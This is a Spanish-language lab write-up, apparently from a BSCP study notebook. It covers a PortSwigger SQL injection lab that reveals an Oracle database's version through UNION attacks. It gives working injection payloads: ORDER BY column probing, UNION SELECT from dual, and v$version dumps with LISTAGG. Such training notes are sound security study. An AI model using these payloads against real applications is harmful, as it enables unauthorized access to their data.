---
tipo: lab
vuln: sqli
nivel: practitioner
tags: [bscp, tipo/lab, vuln/sqli, nivel/practitioner, estado/resuelto]
fase: [1-acceso]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
estado: resuelto
---

# SQL Injection · Lab 04 — Oracle DB version (practitioner) ✅

## Objetivo
Mostrar la versión/tipo de la base de datos (Oracle) mediante un ataque UNION en el filtro de categoría.

## Fase(s)
- 1-acceso

## Pasos realizados
- Capturé la petición del filtro con Burp: `GET /filter?category=Corporate+gifts`.
- Determiné el nº de columnas con `ORDER BY` (error en 3 → **2 columnas**):
  `/filter?category=Corporate+gifts' ORDER BY 1--` … `ORDER BY 2--` (ok), `ORDER BY 3--` (error).
- Confirmé las 2 columnas con UNION (Oracle exige `FROM dual`):
  `/filter?category=Corporate+gifts' UNION SELECT NULL,NULL FROM dual--`
- Localicé la columna de texto con un marcador (`'a'`) y volqué la versión desde `v$version`.

## Payload usado (solución real)
```
' UNION SELECT BANNER, NULL FROM v$version--
```
Variante que concatena todas las líneas en una sola celda:
```
' UNION SELECT (SELECT LISTAGG(banner, CHR(10)) WITHIN GROUP (ORDER BY rownum) FROM v$version), NULL FROM dual--
```

## Qué generalizo
- **Oracle:** todo `SELECT` necesita `FROM` → usa `FROM dual`; la versión vive en `v$version`.
- **Nº de columnas:** `ORDER BY N` hasta el error; confirma con `UNION SELECT NULL,…`.
- **Columna visible:** inserta un marcador de texto (`'a'`) para ver cuál se refleja en la UI.
- **Concatenar varias filas en una celda (Oracle):** `LISTAGG(col, CHR(10))`.

## Enlace academy
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
